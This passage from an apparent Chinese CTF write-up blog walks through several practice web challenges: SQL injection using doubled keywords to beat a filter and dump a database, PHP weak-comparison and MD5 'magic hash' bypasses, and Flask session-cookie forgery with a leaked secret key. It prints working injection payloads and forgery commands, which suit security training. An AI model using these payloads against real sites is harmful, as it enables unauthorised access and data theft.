False</code></pre></blockquote><p>用户名输入admin,密码栏输入万能密码<code>amin'or'1</code>，发现不对，NO,Wrongusernamepassword！！！【==<strong>后续发现这里就可以猜出是replace了关键字，不然不可能回显密码错误，而应该爆出账号密码</strong>==】</p><p>密码输入<code>admin'</code>，回显error，密码输入<code>amin'#</code>，回显NO,Wrongusername password！！！，说明密码这存在字符注入</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220218143127168.png" alt="image-20220218143127168" style="zoom:67%;"></p><p>用户名输入<code>1′ or 1=1 or '1'='1</code>，密码admin，回显Error，说明用户名出存在字符注入</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220218142842677.png" alt="image-20220218142842677"></p><p>但是这个回显为什么只回显一部分?不懂，搜wp猜测是删掉了关键词</p><p>比如password输入or，回显没输入password，说明删掉了（过滤）关键词or，<code>oror</code>，也不行，<code>oorr</code>可以绕过，印证猜测，就是把关键词换位空</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220222121231.png" alt="image-20220220222121231" style="zoom: 50%;"></p><p>然后重新输入万能密码，发现成功登录</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220221001708538.png" alt="image-20220221001708538" style="zoom:50%;"></p><pre><code class="hljs pgsql"><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27; oorr &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span></code></pre><ol type="1"><li><p>猜测列数，order和by都被过滤==》双写</p><pre><code class="hljs pgsql"><span class="hljs-keyword">check</span>.php?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;oorrder bbyy 4 --+  //报错Unknown column &#x27;</span><span class="hljs-number">4</span><span class="hljs-string">&#x27; in &#x27;</span><span class="hljs-keyword">order</span> claus<span class="hljs-string">e&#x27;</span><span class="hljs-string">check.php?username=admin&amp;password=1&#x27;</span>oorrder bbyy <span class="hljs-number">3</span><span class="hljs-comment">--+  //NO,Wrong username password！！！说明有3列</span></code></pre></li><li><p>猜测位置，同理，只输入union select 1,2,3，报错version for theright syntax to use near '1,2,3-- '' at line 1，说明<span style="background:#FF9999;">吞了</span>union和select，同样用双写绕过</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220233828652.png" alt="image-20220220233828652" style="zoom:67%;"></p><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>--+  //发现回显位置<span class="hljs-number">2</span>,<span class="hljs-number">3</span></code></pre><ol start="3" type="1"><li><p>爆数据库名：geek</p><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>--+</code></pre></li><li><p>爆所有库：Your password is'information_schema,mysql,performance_schema,test,ctf,geek'//可疑库：ctf</p><pre><code class="hljs apache"><span class="hljs-attribute">check</span>.php?username=admin&amp;password=<span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) ffromrom infoorrmation_schema.schemata--+  // use near &#x27;.schemata,<span class="hljs-number">3</span>-- &#x27;&#x27; at line <span class="hljs-number">1</span></code></pre><p><strong>注意❗information.schema被过滤可能因为information里的or，而不是整个information被过滤</strong></p></li></ol></li></ol><h4 id="如何测试那些关键词被过滤用什么代替">如何测试那些关键词被过滤？用什么代替？</h4><p>先在password单独测试关键词，例如password输入from，回显Input yourusername and password，说明被吞==》输入ffromrom，回显NO,Wrong usernamepassword！！！，成功绕过 ==》<strong><span style="background:#FF9999;">先测试关键词+绕过方法再注入，不然不知道是哪个词出现了问题</span></strong></p><p>或者知道几列后，在某个位置用''直接回显，看他是不是自己，印证猜想：replace关键词为空</p><pre><code class="hljs ada"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;uunionnion</span> sselectelect <span class="hljs-number">1</span>,<span class="hljs-symbol">&#x27;information</span>&#x27;,<span class="hljs-number">3</span><span class="hljs-comment">--+</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220220235721090.png" alt="image-20220220235721090" style="zoom:67%;"></p><ol start="5" type="1"><li><p>爆表名：'b4bsql,geekuser'</p><pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) ffromrom infoorrmation_schema.tables wwherehere table_schema=database()--+</code></pre></li><li><p>爆列名：'id,username,password'</p><pre><code class="hljs ada"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;uunionnion</span> sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) ffromrom infoorrmation_schema.columns wwherehere table_name=<span class="hljs-symbol">&#x27;b4bsql</span>&#x27;<span class="hljs-comment">--+   //注意❗要加引号</span></code></pre></li><li><p>爆具体数据</p><pre><code class="hljs reasonml"><span class="hljs-number">1</span>&#x27;uunionnion sselectelect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group<span class="hljs-constructor">_concat(<span class="hljs-params">concat_ws</span>(&#x27;--&#x27;,<span class="hljs-params">id</span>,<span class="hljs-params">username</span>,<span class="hljs-params">passwoorrd</span>)</span>) ffromrom b4bsql--+</code></pre><p>'1--cl4y--i_want_to_play_2077,2--sql--sql_injection_is_so_fun,3--porn--do_you_know_pornhub,4--git--github_is_different_from_pornhub,5--Stop--you_found_flag_so_stop,6--badguy--i_told_you_to_stop,7--hacker--hack_by_cl4y,8--flag--flag{4a2ddb62-9290-4b79-bce5-c2222e134275}'</p></li></ol><p>得到flag</p><h2 id="actf2020-新生赛backupfile简单">[ACTF2020新生赛]BackupFile(简单)</h2><h4 id="考点备份文件弱类型比较数字相等">考点：备份文件、弱类型比较：数字相等</h4><p>御剑扫到index.php.bak，得到源码</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220221234847834.png" alt="image-20220221234847834" style="zoom: 67%;"></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;    $key = $_GET[<span class="hljs-string">&#x27;key&#x27;</span>];    <span class="hljs-keyword">if</span>(!is_numeric($key)) &#123;  <span class="hljs-comment">//key得是数字</span>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);    &#125;    $key = intval($key);    $str = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;    <span class="hljs-keyword">if</span>($key == $str) &#123;   <span class="hljs-comment">//弱类型比较</span>        <span class="hljs-keyword">echo</span> $flag;    &#125;&#125;<span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;&#125;</code></pre><p><strong>弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。所以直接传入key=123就行</strong></p><p>弱类型比较跟123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3相等即可==》数字，123</p><h2 id="bjdctf2020easy-md5">[BJDCTF2020]Easy MD5</h2><h4 id="考点md5弱类型强类型都考了f12网络抓包看hint">考点：md5弱类型+强类型都考了、F12网络抓包看hint</h4><p>一开始找不到要干啥，找WP发现，输入1，F12查看网络，得到提示/burp抓包也能看到，Hint:select * from 'admin' where password=md5($pass,true)</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222000509201.png" alt="image-20220222000509201" style="zoom:67%;"></p><p><strong><em>md5(string,raw):可选。规定十六进制或二进制输出格式：TRUE- 原始 16 字符二进制格式，FALSE - 默认。32字符十六进制数</em></strong></p><p>万能密码：</p><pre><code class="hljs angelscript"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or&#x27;</span><span class="hljs-number">1</span></code></pre><p>得找到某个东西使它md5 二进制后为万能密码，，看WP</p><ol type="1"><li>ffifdyop，md5 二进制后是<code>'or'6�]��!r,��b</code></li></ol><blockquote><p>这里提供一个==<strong>最常用的：ffifdyop</strong>==，该字符串md5加密后若raw参数为True时会返回<code>'or'6&lt;trash&gt;</code>(<code>&lt;trash&gt;</code>其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的<code>&lt;trash&gt;</code>会在MySQL将其转换成整型比较时丢掉)</p></blockquote><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222001300948.png" alt="image-20220222001300948"></p><ol start="2" type="1"><li>输入后跳转到/levels91.php</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222001617105.png" alt="image-20220222001617105" style="zoom:67%;"></p><p>查看源码得到php</p><pre><code class="hljs php">&lt;!--$a = $GET[<span class="hljs-string">&#x27;a&#x27;</span>];$b = $_GET[<span class="hljs-string">&#x27;b&#x27;</span>];<span class="hljs-keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;    <span class="hljs-comment">// wow, glzjin wants a girl friend.</span>--&gt;</code></pre><p><strong>典型的md5碰撞，</strong>要求ab不同但md5相同，弱类型比较，<strong>弱类型比较可以通过两个0e开头的md5绕过</strong></p><p><strong>这里提供一些md5以后是0e开头的值：</strong>【更多参考<a href="https://www.jianshu.com/p/c5b05c766906">wp</a>】</p><pre><code class="hljs angelscript">QNKCDZO<span class="hljs-number">0e830400451993494058024219903391</span>s878926199a<span class="hljs-number">0e545993274517709034328855841020</span>s155964671a<span class="hljs-number">0e342768416822451524974117254469</span>s214587387a<span class="hljs-number">0e848240448830537924465865611904</span>s214587387a<span class="hljs-number">0e848240448830537924465865611904</span></code></pre><p>构造levels91.php?a=QNKCDZO&amp;b=s878926199a，发现又跳转到新的页面levell14.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">if</span>($_POST[<span class="hljs-string">&#x27;param1&#x27;</span>]!==$_POST[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="hljs-string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;    <span class="hljs-keyword">echo</span> $flag;&#125;</code></pre><p>强类型比较，需要1.强碰撞：<strong>找到两个md5值相同的字符串即可</strong>/2.绕过：<strong>数组绕过</strong></p><pre><code class="hljs php">md5(<span class="hljs-keyword">array</span>()) = <span class="hljs-literal">null</span><span class="hljs-comment">//更多：</span>sha1(<span class="hljs-keyword">array</span>()) = <span class="hljs-literal">null</span>    ereg(pattern,<span class="hljs-keyword">array</span>()) = <span class="hljs-literal">null</span> vs preg_match(pattern,<span class="hljs-keyword">array</span>) = <span class="hljs-literal">false</span>strcmp(<span class="hljs-keyword">array</span>(), <span class="hljs-string">&quot;abc&quot;</span>) = <span class="hljs-literal">null</span>strpos(<span class="hljs-keyword">array</span>(),<span class="hljs-string">&quot;abc&quot;</span>) = <span class="hljs-literal">null</span></code></pre><p>payload：</p><pre><code class="hljs apache"><span class="hljs-attribute">param1</span>[]=&amp;param<span class="hljs-number">2</span>[]=<span class="hljs-number">2</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220222002727828.png" alt="image-20220222002727828" style="zoom: 67%;"></p><h4 id="如何找到特定开头的md5值">如何找到特定开头的md5值？</h4><blockquote><p><a href="https://www.cnblogs.com/yesec/p/12535534.html">**大佬博客</a></p></blockquote><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>;;) &#123;  <span class="hljs-keyword">for</span> ($c = <span class="hljs-number">0</span>; $c &lt; <span class="hljs-number">1000000</span>; $c++, $i++)  <span class="hljs-keyword">if</span> (stripos(md5($i, <span class="hljs-literal">true</span>), <span class="hljs-string">&#x27;\&#x27;or\&#x27;&#x27;</span>) !== <span class="hljs-literal">false</span>)   <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\nmd5(<span class="hljs-subst">$i</span>) = &quot;</span> . md5($i, <span class="hljs-literal">true</span>) . <span class="hljs-string">&quot;\n&quot;</span>; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;.&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span><span class="hljs-comment">//引用于 http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</span></code></pre><h2 id="hctf-2018admin">[HCTF 2018]admin(**)</h2><h4 id="考点flask客户端session伪造">考点:flask、客户端session伪造</h4><blockquote><p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">csdn三种解法WP</a></p><p>更多：<a href="https://inhann.top/2021/02/25/flask_newer/">flask漏洞利用小结</a></p><p>参考：<a href="https://xz.aliyun.com/t/3679"><strong>详细，易懂，适合小白+CTF各种过滤绕过姿势</strong></a></p></blockquote><h4 id="flask">Flask</h4><p>==Flask==：一个用Python编写的轻量级Web应用框架。基于WerkzeugWSGI工具箱和Jinja2模板引擎。</p><p>参考：https://www.jianshu.com/p/d537d634df7b</p><p>​ 总结一下，Flask处理一个请求的流程就是，首先根据 URL决定由那个函数来处理，然后在函数中进行操作，取得所需的数据。再将数据传给相应的模板文件中，由Jinja2负责渲染得到 HTTP 响应内容，然后由Flask返回响应内容。</p><ul><li><p>注意</p><p>render_template()是用来渲染一个指定的文件的。使用如下：returnrender_template('index.html')render_template_string则是用来渲染一个字符串的。<strong>SSTI与这个方法密不可分</strong>。</p></li></ul><p>​<strong>简单来说也就是不正确的使用flask中的render_template_string方法会引发SSTI。</strong></p><ol type="1"><li><strong>根据题目提示的admin,猜测是不是要让我用admin来登录这个网站？然后我在login界面输入用户名”admin“,密码”123“（弱口令）结果成功登录得到flag</strong></li><li>常规做法：先注册用户，登录用户后在修改密码查看源码，发现提示flask==&gt;框架，从GitHub上down源码</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220223143114609.png" alt="image-20220223143114609"></p><ol start="3" type="1"><li><p>看到源码尝试模板注入，注册用户时regester.html有双大括号</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304184440886.png" alt="image-20220304184440886" style="zoom: 67%;"></p><p>发现不行，并不响应</p></li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304184231019.png" alt="image-20220304184231019" style="zoom:50%;"></p><p>而所有的传参form都经过了NewpasswordForm，转到定义，看不出来啥，猜测是被过滤了==》后续查看模板注入，发现<strong>只有render_template_string会导致注入</strong>，而且模板文件若已有<code>{{}}`,则无法产生注入，而模板语言无`{{}}</code>，输入参数可以<code>{{}}`的话就可以，参考https://xz.aliyun.com/t/3679> **两种代码的形式是，一种当字符串来渲染并且使用了%(request.url)【参数可控】，另一种规范使用index.html渲染文件。我们漏洞代码使用了render_template_string函数，而如果使用render_template函数，将url里写自己想要的恶意代码`{{}}</code>传入进去并不会执行【良好的代码规范，使得模板其实已经固定了，已经被render_template渲染了，参数已经不可控】**</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304185102492.png" alt="image-20220304185102492" style="zoom:67%;"></p><ol start="3" type="1"><li>查看源码，在index.html得到flag的相关信息</li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220223145017072.png" alt="image-20220223145017072" style="zoom: 50%;"></p><p>要求current_user.is_authenticated and session['name'] == 'admin'</p><h4 id="flask_session伪造">flask_session伪造</h4><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html#">客户端session 导致的安全问题、flask</a></p><p><a href="https://chenlvtang.top/2021/02/01/Flask%E5%AE%A2%E6%88%B7%E7%AB%AFsession%E4%BC%AA%E9%80%A0/">Flask客户端session伪造</a></p></blockquote><p><strong>一般session会被保存到服务端中（服务端cookie，但是flask的session是存储在客户端的cookie里的</strong></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/6277797-c018a4c5b5be1541.png" alt="img"></p><blockquote><p>flask对session的处理位于flask/sessions.py中（本题没找到），默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。</p></blockquote><p>session一般格式：</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/t01ef54ad8392df284d.png" alt="img"></p><pre><code class="hljs gcode">.eJwljrFuwzAMBf<span class="hljs-number">9</span>FcwZSpkQyP<span class="hljs-number">2</span><span class="hljs-symbol">NQoh5</span>aBGgB<span class="hljs-meta">O5</span>mC_Hs<span class="hljs-symbol">NdLy75</span>d<span class="hljs-number">5</span>lx<span class="hljs-number">7</span>HOr<span class="hljs-number">3</span>J_Hq<span class="hljs-number">91</span>K_t<span class="hljs-number">3</span>l<span class="hljs-symbol">nuxGamDI6</span>kmLPpa<span class="hljs-number">1</span>TE<span class="hljs-number">0</span>UKteyYSpJyaaVJ<span class="hljs-number">8</span>hRGZDk<span class="hljs-number">7</span>ZtLlEbpALjxjOc<span class="hljs-number">1</span>SaZWzLSx-aB<span class="hljs-number">3</span>p<span class="hljs-number">0</span>djSta<span class="hljs-number">984</span>kjXqMrQqrE<span class="hljs-number">3</span>WhBM<span class="hljs-meta">o18</span>jrX<span class="hljs-number">8</span>X_D<span class="hljs-number">9</span>eJ<span class="hljs-number">5</span>Htifv<span class="hljs-number">4</span>_<span class="hljs-number">1</span>cxltCgQ<span class="hljs-number">3</span>V<span class="hljs-number">0</span>zvIsGBjDAlGQsq<span class="hljs-symbol">NJEi08</span>v<span class="hljs-symbol">nD15</span>kP<span class="hljs-number">8</span>Q.XxKIMg.iW<span class="hljs-number">96</span>TDgIamKLQ<span class="hljs-number">0</span>x<span class="hljs-number">9</span>h<span class="hljs-number">5</span>LoPsUCIvw</code></pre><p>通过.隔开的<strong>3段内容</strong>，第一段其实就是base64encode后的内容，但去掉了填充用的等号，若decode失败，自己需要补上1-3个等号补全。中间内容为时间戳，在flask中时间戳若超过31天则视为无效。最后一段则是安全签名，将sessiondata,时间戳，和flask的secretkey通过sha1运算的结果。</p><pre><code class="hljs php">json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息</code></pre><ul><li><p>服务端每次收到cookie后，会将cookie中前两段取出和secretkey做sha1运算，若结果与cookie第三段不一致则视为无效。</p></li><li><p>漏洞成因漏洞的根源是<strong>secretkey被获取</strong>，应当使用完全随机的secretkey，或在clone某项目后修改为随机的key。<strong>需要特别注意的是python2与python3下产生的timestamp是不一样的！</strong></p></li><li><p>==生成 session cookie 需要 secret_key 解码 session cookie可以不需要 secret_key==</p></li><li><p><strong>利用工具：</strong></p></li></ul><p>​ https://github.com/noraj/flask-session-cookie-manager</p><p>​<strong>由上文所述的session格式可知，要修改并伪造一个session的必要条件就是知道加密所采用的</strong><code>secret_key</code><strong>，一旦获取到</strong><code>secret_key</code><strong>,我们就可以轻松的构造签名，从而实现客户端的session的伪造。</strong></p><ul><li><strong>安装问题</strong>：<a href="https://chenlvtang.top/2020/07/28/Flask%E3%81%AE%E5%88%9D%E8%AF%86/">参考博客</a>，安装完后出现helloworld后退出虚拟环境，直接运行脚本【注意，虚拟环境里设置的脚本是python.exe所以用法是pythonflask_xxx而不是python3 flask_xxx】</li></ul><p>cmd直接执行某文件夹下的exe：</p><pre><code class="hljs taggerscript">&quot;D:<span class="hljs-symbol">\W</span>ork<span class="hljs-symbol">\v</span>scode<span class="hljs-symbol">\M</span>icrosoft VS Code<span class="hljs-symbol">\_</span><span class="hljs-symbol">\C</span>ode.exe&quot;    //路径有空格情况下要加书昂引号</code></pre><p>用法：</p><p>解密:<code>python flask_session_manager.py decode -s SECRET_KEY -c session</code></p><p>加密:<code>python flask_session_manager.py encode -s SECRET_KEY -t 未加密session</code></p><pre><code class="hljs python">加密：【必须要有secret_key】$ python&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125; flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.py encode -s <span class="hljs-string">&#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span> -t <span class="hljs-string">&#x27;&#123;&quot;number&quot;:&quot;326410031505&quot;,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span>==》eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw解密：【可有可无key】有key:$ python&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125; flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.py decode -c <span class="hljs-string">&#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span> -s <span class="hljs-string">&#x27;.&#123;y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV&#125;;K|ghT^d&#x27;</span>==》&#123;<span class="hljs-string">u&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">u&#x27;number&#x27;</span>: <span class="hljs-string">&#x27;326410031505&#x27;</span>&#125;无kwy：$ python&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125; flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.py decode -c <span class="hljs-string">&#x27;eyJudW1iZXIiOnsiIGIiOiJNekkyTkRFd01ETXhOVEExIn0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.DE2iRA.ig5KSlnmsDH4uhDpmsFRPupB5Vw&#x27;</span>==》&#123;<span class="hljs-string">&quot;number&quot;</span>:&#123;<span class="hljs-string">&quot; b&quot;</span>:<span class="hljs-string">&quot;MzI2NDEwMDMxNTA1&quot;</span>&#125;,<span class="hljs-string">&quot;username&quot;</span>:&#123;<span class="hljs-string">&quot; b&quot;</span>:<span class="hljs-string">&quot;YWRtaW4=&quot;</span>&#125;&#125;</code></pre><p>注册用户abc，密码123，F12抓包得到session</p><pre><code class="hljs apache"><span class="hljs-attribute">session</span>=.eJxFkEGLwjAQhf_KkrOHNlsvggeXmNDCTKmkDZOLqFuNiXGhKmrF_<span class="hljs-number">751</span>F<span class="hljs-number">3</span>aP<span class="hljs-number">7837</span>HjPzYMtt<span class="hljs-number">154</span>cm<span class="hljs-number">5</span>y<span class="hljs-number">7</span>Sztiy_<span class="hljs-number">0</span>nmzzY<span class="hljs-number">25</span>pNGIiFt<span class="hljs-number">0</span>JG<span class="hljs-number">9</span>DBGtXAg<span class="hljs-number">6</span>rTUszH<span class="hljs-number">2</span>eV<span class="hljs-number">8</span>KGaB<span class="hljs-number">3</span>DgzcStME<span class="hljs-number">0</span>EXAWGUQc<span class="hljs-number">05</span>mIJT<span class="hljs-number">01</span>H<span class="hljs-number">8</span>EinVmReFQ<span class="hljs-number">15</span>y<span class="hljs-number">0</span>jcjzjEwRrK<span class="hljs-number">8</span>SVI<span class="hljs-number">23</span>Zn<span class="hljs-number">61</span>Hu<span class="hljs-number">7</span>WUIpi<span class="hljs-number">0</span>AoPKOSBTH<span class="hljs-number">5</span>DPcvA<span class="hljs-number">0</span>N<span class="hljs-number">3</span>qalyaeYZ<span class="hljs-number">6</span>l<span class="hljs-number">6</span>DecKvqd_IyoJhz<span class="hljs-number">0</span>HWKOkzZc<span class="hljs-number">8</span>Q<span class="hljs-number">2</span>p<span class="hljs-number">267</span>PH-F<span class="hljs-number">9</span>vh_Qmwc<span class="hljs-number">8</span>OoGfc<span class="hljs-number">3</span>RD<span class="hljs-number">1</span>EjA<span class="hljs-number">3</span>kb<span class="hljs-number">0</span>FMCrzUGPeDXUslIfeFRUQaz<span class="hljs-number">6</span>U_dPq<span class="hljs-number">527</span>V_T<span class="hljs-number">6</span>ugarH<span class="hljs-number">4</span>nx<span class="hljs-number">1</span>VsX<span class="hljs-number">9</span>Z<span class="hljs-number">6</span>w<span class="hljs-number">0</span>bscmq<span class="hljs-number">7</span>n<span class="hljs-number">6</span>-xNGHPbzbYaq<span class="hljs-number">0</span>.YiIR<span class="hljs-number">9</span>A.ANlJjD-W<span class="hljs-number">7</span>HclEQHya-wgAX<span class="hljs-number">8</span>O<span class="hljs-number">9</span>uo; HttpOnly; Path=/</code></pre><p>要生成session需要secret_key，搜索，在config.py中找到secret_key：ckj123</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304224727300.png" alt="image-20220304224727300"></p><p>解密失败：[Decoding error] Invalid base64-encoded data</p><p><span style="background:#FF9999;"><strong>注意：解密的序列串前的点（.）不能少！而且最好用双引号、有secret_key下用key完全解密，否则解密出来还是base64的</strong></span></p><pre><code class="hljs bash">python flask_session_cookie_manager3.py decode -c <span class="hljs-string">&quot;.eJxFkEGLwjAQhf_KkrOHNlsvggeXmNDCTKmkDZOLqFuNiXGhKmrF_751F3aP7837HjPzYMtt154cm5y7Sztiy_0nmzzY25pNGIiFt0JG9DBGtXAg6rTUszH2eV8KGaB3DgzcStME0EXAWGUQc05mIJT01H8EinVmReFQ15y0jcjzjEwRrK8SVI23Zn61Hu7WUIpi0AoPKOSBTH5DPcvA0N3qalyaeYZ6l6DecKvqd_IyoJhz0HWKOkzZc8Q2p267PH-F9vh_Qmwc8OoGfc3RD1EjA3kb0FMCrzUGPeDXUslIfeFRUQaz6U_dPq527V_T6ugarH4nx1VsX9Z6w0bscmq7n6-xNGHPbzbYaq0.YiIR9A.ANlJjD-W7HclEQHya-wgAX8O9uo&quot;</span> -s ckj123&#123;<span class="hljs-string">&#x27;_fresh&#x27;</span>: True, <span class="hljs-string">&#x27;_id&#x27;</span>: b<span class="hljs-string">&#x27;04cd1f6394da05590972381d38a1c19ed12d6d82b6acc0acc0dbe8d2a556a6f7b8abdf444ecea0f32ef545cdce41eab15081f2e499a8584576de7b1d41615559&#x27;</span>, <span class="hljs-string">&#x27;csrf_token&#x27;</span>: b<span class="hljs-string">&#x27;2ea3d13566555adb6d6641bdead5908afc2c4f80&#x27;</span>, <span class="hljs-string">&#x27;image&#x27;</span>: b<span class="hljs-string">&#x27;jxU5&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;user_id&#x27;</span>: <span class="hljs-string">&#x27;10&#x27;</span>&#125;</code></pre><p>看到用户abc</p><p>或者可以直接用p牛的解密脚本，无需key</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220305135431149.png" alt="image-20220305135431149"></p><p>试试改为admin，+key生成session：</p><pre><code class="hljs cmd">python flask_session_cookie_manager3.py encode -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;<span class="hljs-number">04</span>cd1f6394da05590972381d38a1c19ed12d6d82b6acc0acc0dbe8d2a556a6f7b8abdf444ecea0f32ef545cdce41eab15081f2e499a8584576de7b1d41615559&#x27;, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">2</span>ea3d13566555adb6d6641bdead5908afc2c4f80&#x27;, &#x27;image&#x27;: b&#x27;jxU5&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;<span class="hljs-number">10</span>&#x27;&#125;&quot; -s ckj123.eJxFkE-LwjAQxb_KkrOHNtteBA8uMaGFmVJJG5KL-KeaJqYLVVErfvetLuwe35v3e8zMg6z2fXOyZHruL82ErNodmT7Ix4ZMCbClM4wHdJCiWFpgVVzIeYpDNhSMexisBQW3QtUeZO4xlAmEjGo1EoI7PXx5HarEsNyirKiWJiDNEq1yb1wZoaidUYurcXA3SsfIRi3wiIwftcpuKOcJKH03skwLtUhQHiKUW2pE9akd98gWFGQVo_Qz8pyQ7anfr87fvun-Twi1BVreYKgoujGquNfOeHQ6gtcaox7xayF40EPuUOgE5rN3XRvWh-avad3ZGsvfSbcOzcvahbYjE3I5Nf37bySOyPMHEwhrkA.YiIoxQ.<span class="hljs-number">1</span>STJCvyLZME_COi7806tpsQssx4</code></pre><p>提交伪造session得到flag</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220304225810232.png" alt="image-20220304225810232" style="zoom: 67%;"></p><h4 